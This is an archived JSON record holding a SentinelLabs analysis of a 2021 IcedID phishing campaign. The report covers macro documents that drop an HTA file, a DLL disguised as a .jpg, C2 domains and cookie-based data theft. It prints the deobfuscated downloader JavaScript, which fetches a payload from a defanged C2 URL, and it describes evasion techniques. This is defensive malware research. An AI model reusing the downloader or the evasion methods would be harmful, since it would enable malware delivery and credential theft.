{
    "id": "5b3d603c-6ee2-4ef0-bc98-8de763a5fa2f",
    "created_at": "2023-01-12T15:04:47.18046Z",
    "updated_at": "2025-03-27T02:05:38.315293Z",
    "deleted_at": null,
    "sha1_hash": "c04f725cb16d193bd13715d8db626faccac6789d",
    "title": "2021-06-24 - Evasive Maneuvers - Massive IcedID Campaign Aims For Stealth with Benign Macros",
    "authors": "",
    "file_creation_date": "2022-05-28T00:39:54Z",
    "file_modification_date": "2022-05-28T00:39:54Z",
    "file_size": 3774083,
    "plain_text": "# Evasive Maneuvers | Massive IcedID Campaign Aims For Stealth with Benign Macros\n\n**[labs.sentinelone.com/evasive-maneuvers-massive-icedid-campaign-aims-for-stealth-with-benign-macros/](https://labs.sentinelone.com/evasive-maneuvers-massive-icedid-campaign-aims-for-stealth-with-benign-macros/)**\n\nMarco Figueroa\n\n## Executive Summary\n\nSentinelLabs has uncovered a recent IcedID campaign and analyzed nearly 500\nartifacts associated with the attacks.\nIcedID Office macro documents use multiple techniques in an attempt to bypass\ndetection.\nTo further obfuscate the attack, data embedded in the document itself is used by the\nmalicious macro. Analyzing only the macro provides an incomplete view of the attack.\nThe HTA dropper embedded in the document is obfuscated JavaScript, which executes\nin memory and utilizes additional techniques to evade AV/EDR.\n\n## Overview\n\nMany security researchers thought that IcedID would be the successor to Emotet after the\ncoordinated takedown of Emotet malware in early 2021 by law enforcement agencies. IcedID\n(aka BokBot) was designed as a banking trojan targeting victims’ financial information and\nacting as a dropper for other malware. Initially discovered in 2017, IcedID has become a\n\n\n-----\n\nprominent component in financially-driven cybercrime. The malware is primarily spread via\nphishing emails typically containing Office file attachments. The files are embedded with\nmalicious macros that launch the infection routine, which retrieves and runs the payload.\n\nIn May 2021, SentinelLabs observed a new campaign delivering IcedID through widespread\nphishing emails laced with poisoned MS Word attachments that use a simple but effective\ntechnique to avoid suspicion. This ongoing IcedID campaign attempts to gain a foothold on\nthe victim’s machine through a crafted Word doc in which the embedded macro itself does\nnot contain any malicious code.\n\nJust like a genuine macro, the IcedID macro operates on the content of the document itself.\nIn this case, that content includes obfuscated JavaScript code. This simple technique helps\nto evade many automated static and dynamic analysis engines since the content’s malicious\nbehavior is dependent upon execution through an MS Office engine.\n\nThe obfuscated JavaScript is responsible for dropping a Microsoft HTML Application (HTA)\nfile to `C:UsersPublic . The macro then employs Internet Explorer’s` `mshta.exe utility to`\nexecute the HTA file. This second stage execution reaches out to the attacker’s C2 and\ndownloads a DLL file with a .jpg extension to the same Public folder. The HTA file calls\n```\nrundll32 to execute this payload, which serves to collect and exfiltrate user data to the\n\n```\nattacker’s C2.\n\nBelow we present further technical details of this recent campaign from examination of\nalmost 500 artifacts.\n\n## Technical Analysis\n\nThe IcedID phishing email contains what looks like an innocuous enough Word attachment.\nAs expected with these kinds of malware operations, opening the document prompts the\nuser to enable editing and then ‘Enable content’.\n\nTargets are prompted to enable macros when opening the maldoc\nWhat is unexpected is that the macro itself is uninteresting.\n\n\n-----\n\nThe VBA macros contained in the document\nIn this case, the malicious code is found within the document itself, reversed JavaScript that\nis then [base64 encoded.](https://www.sentinelone.com/blog/guide-encode-decoded-base64/)\n\nObfuscated code in the document.xml\nThe MS Word macro writes this code out as an HTA file to `C:UsersPublic . While this`\nensures success in terms of user permissions, arguably this is an operational mistake from\nthe attacker’s side in the sense that this folder is a location generally monitored by security\nproducts.\n\nThe HTA code is executed by the macro using the `GetObject() and` `Navigate()`\nfunctions. This behavior is a “VB Legacy” technique that conforms to how older Office macro\nfiles behave.\n\n\n-----\n\nPart of the VBA code embodied in the Word Document\nOnce the HTA code is running, it deobfuscates the JavaScript code in-memory and utilizes\ntwo additional techniques in an attempt to evade AV/EDR security controls:\n\nThe HTA file contains `msscriptcontrol.scriptcontrol COM component, which is`\nused to execute interactively with JavaScript.\nThe code calls JavaScript functions from VBScript code within the HTA. This technique\nalso confuses different code and activity tracking engines within certain endpoint\nsecurity products.\n\nHTA file dropped in the\n\nPublic folder\nBelow is the deobfuscated and ‘beautified’ version of the code from the HTA file.\n\n\n-----\n\n```\nvar memoryVb new ActiveXObject( msxml2.xmlhttp );\nmemoryVb.open(\"GET\",\n\"hxxp[:]//awkwardmanagement2013z[.]com/adda/hMbq4kHp63r/qv2KrtCyxsQZG2qnnjAyyS2THO0dNJ\nsid=Kbgn&cid=yvlBl2mDXC7d6A6q&gRqB5BwPw=3P3WdrE&user=Ma\", false);\nmemoryVb.send();\nif (memoryVb.status == 200) {\n     try {\n          var rightClass = new ActiveXObject(\"adodb.stream\");\n          rightClass.open;\n          rightClass.type = 1;\n          rightClass.write(memoryVb.responsebody);\n          rightClass.savetofile(\"c:userspublicsizeTempStruct.jpg\", 2);\n          rightClass.close;\n     } catch (e) {}\n}\n\n```\n[The code initializes an MSXML2.XMLHTTP request and specifies the method, URL, and](https://docs.microsoft.com/en-us/previous-versions/windows/desktop/ms759148(v=vs.85))\nauthentication information for the request. If the URL responds with a status code of 200, the\ncode proceeds by downloading the remote file with a “.jpg” file extension. Unsurprisingly, the\nfile is not what it pretends to be.\n\nLooking at related domains by the same actor shows the breadth of activity. When tracking\nthis campaign, the domain `mappingmorrage[.]top had numerous duplicates of the “.jpg”`\nfile and the second stage binary associated with this campaign. Multiple file names are used\nsuch as “sizeQuery.jpg”, “sizeTempStruct.jpg”, “tmpSizeLocal.jpg” and so on.\n\n\n-----\n\nIcedID related files on VirusTotal\n\n## IcedID JPG/DLL\n\nChanging file extensions is a common, if unsophisticated, technique aimed at evasion. In this\ncase, the “.jpg” file is actually a DLL. Analysis of the file’s exports reveals the\n```\nDLLRegisterServer function, which is an obvious candidate for the initial installer of the\n\n```\nIcedID malware.\n\n\n-----\n\nPE Studio\nTo unpack this binary, we can load `rundll32.exe in xdbg64 and use the command line`\noption to specify the exported function in `sizeTeamStruct.dll, as shown in the`\nscreenshot below.\n\nLoading rundll + DLL with the exported function\n\n\n-----\n\nTo get to the packed binary, we need to add a breakpoint on `VirtualAlloc and execute`\nthe run command until the breakpoint is hit. We want to look for the call that is responsible\nfor allocating memory in the address space and dump the binary from the address location.\n\nUnpacked IcedID\nLooking at the dumped binary in PE Studio what catches the attention are the\n```\nWinHttpOpenRequest, WinHttpSendRequest, and WinHttpReceiveResponse\n\n```\nfunctions.\n\nThe `WinHttpOpenRequest creates an HTTP request handle and stores the specified`\nparameters in that handle, while `WinHttpSendRequest sends the specified request to the`\nC2 server and the `WinHttpReceiveResponse waits to receive the response.`\n\n\n-----\n\nPE\n\nStudio with the unpacked IcedID\nAfter loading the binary into xdbg64, we add the breakpoint on `WinHttpOpenRequest .`\nWhen this breakpoint is hit, we can see from the disassembly that the code is generating the\ndomain through an xoring operation. This helps us to understand how the C2 value is\n\n\n-----\n\ngenerated.\n\n\n-----\n\nChecking aws.amazon.com connectivity\nSome of the domains collected from our analysis of around 500 samples of IcedID included:\n\n\n-----\n\n```\nepicprotovir[.]download\nessoandmobilcards[.]com\nimmotransfer[.]top\nkickersflyers[.]bid\nmappingmorrage[.]top\nmomenturede[.]fun\nprovokordino[.]space\nquadrogorrila[.]casa\nvaclicinni[.]xyz\nvikolifer[.]top\n\n```\nThese appear to be masked through CloudFlare IPs. For example,\n```\nhxxp[://]mappingmorrage[.]top/\n172.67.196.74\n104.21.57.254\n2606:4700:3037::6815:39fe\n2606:4700:3037::ac43:c44a\n\n```\nThe malware’s main module functions to steal credentials from the victim’s machine,\nexfiltrating information back to the C2 server.\n\nA cookie which has information from the infected host is sent to the C2 and contains the OS\ntype, username, computer name, and CPU domain, giving the operators a good\nunderstanding of the compromised environment.\n```\n__gads:\n_gat: Windows version info 6.3.9600.64 is Windows 8.1 64bit\n_ga: Processor CPUID information\n_u: Username and Computername DESKTOP-FRH1VBHMarcoFB35A6FF06678D37\n__io: Domain id\n_gid: NIC\n\n```\nIceID exfiltrates environmental data via a cookie\nDiscovering network traffic with the headers listed above is an indication that the host has\nbeen infected with IcedID malware.\n\n## Conclusion\n\nMany IcedID attacks begin with a phishing email and users opening the attachment. In this\ncampaign, IcedID uses a maldoc in the initial infection stage in an attempt to bypass\ndefenses by interacting with the contents of the document itself. The use of an HTA file with\nits dependency on IE’s `mshta.exe is reasonably unusual behavior that defenders can`\n\n\n-----\n\nmonitor for in their environments. This, along with other techniques such as changing the file\n[extension and the behavior of the DLL, should be detected by a capable Next Gen security](https://assets.sentinelone.com/sentinellabs/sentinelone-vs-icedid)\nsolution.\n\n## Indicators of Compromise\n\n[https://github.com/SentineLabs/icedID](https://github.com/SentineLabs/icedID)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-06-24 - Evasive Maneuvers - Massive IcedID Campaign Aims For Stealth with Benign Macros.pdf"
    ],
    "report_names": [
        "2021-06-24 - Evasive Maneuvers - Massive IcedID Campaign Aims For Stealth with Benign Macros.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535887,
    "ts_updated_at": 1743041138,
    "ts_creation_date": 1653698394,
    "ts_modification_date": 1653698394,
    "files": {
        "pdf": "https://archive.orkl.eu/c04f725cb16d193bd13715d8db626faccac6789d.pdf",
        "text": "https://archive.orkl.eu/c04f725cb16d193bd13715d8db626faccac6789d.txt",
        "img": "https://archive.orkl.eu/c04f725cb16d193bd13715d8db626faccac6789d.jpg"
    }
}